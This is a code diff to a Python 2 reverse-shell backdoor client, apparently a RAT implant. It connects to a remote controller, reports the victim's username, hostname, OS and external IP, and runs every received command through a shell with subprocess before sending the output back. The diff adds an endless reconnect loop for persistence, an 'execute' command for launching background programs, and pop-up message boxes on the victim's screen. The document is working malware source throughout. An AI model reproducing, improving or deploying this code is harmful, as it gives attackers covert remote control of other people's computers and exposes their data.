@@ -32,8 +32,17 @@ def crypt(TEXT, encode=True):
         return base64.b64decode(TEXT)
 
 def send(data):
+    s.sendall(crypt(os.getcwd()))
     s.sendall(crypt(data))
-
+    
+def messageBox(message):
+    root = Tk()
+    root.attributes('-topmost', True)
+    root.title(message)
+    z = Label(text=message)
+    z.pack()
+    root.mainloop()
+    
 def info():
     try:
         ip = re.findall('": "(.*?)"', urllib2.urlopen("http://my-ip.herokuapp.com/").read())[0]
@@ -48,15 +57,7 @@ def info():
 [>] Date\t: %s
 [>] IP Adress\t: %s
 """%(getpass.getuser(), socket.gethostname(), platform.platform(), time.strftime("%c"), ip)
-    send(crypt(message))
-
-def messageBox(message):
-    root = Tk()
-    root.attributes('-topmost', True)
-    root.title(message)
-    z = Label(text=message)
-    z.pack()
-    root.mainloop()
+    send(message)
 
 def connect():
     global s
@@ -74,35 +75,43 @@ def main():
             try:
                 os.chdir(command[3:].decode("utf-8"))
                 send(" ")
-            except:
-                pass
+            except OSError:
+                send("%s: No such file or directory"%(command[3:]))
 
         elif command == "info()":
             info()
             main()
 
+        elif "execute" in command:
+            command = command.replace("execute ", "")
+            subprocess.Popen(command, shell=True)
+            send("Running program in a new process\n")
+            
         elif "message" in command:
             messageBox(command.replace("message ", ""))
             send(" ")
-
-        elif ":execute" in command:
-            command = command.replace(":execute ", "")
-            subprocess.Popen(command, shell=True)
-            send("Running program in a new process\n")
-
+            
         elif command == "pwd":
             send(os.getcwd()+"\n")
 
         else:
             process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            send(process.stdout.read() + process.stderr.read())
-
+            output = process.stdout.read() + process.stderr.read()
+            if output == "":
+                output = " "
+            send(output)
+            
     s.close()
 
+def start():
+    while True:
+		try:
+			connect()
+			send(socket.gethostname())
+			main()
+		except:
+			start()
+
+
 if __name__ == "__main__":
-    try:
-        connect()
-        s.sendall(crypt(socket.gethostname()))
-        main()
-    except Exception as e:
-        print " "
+	start()
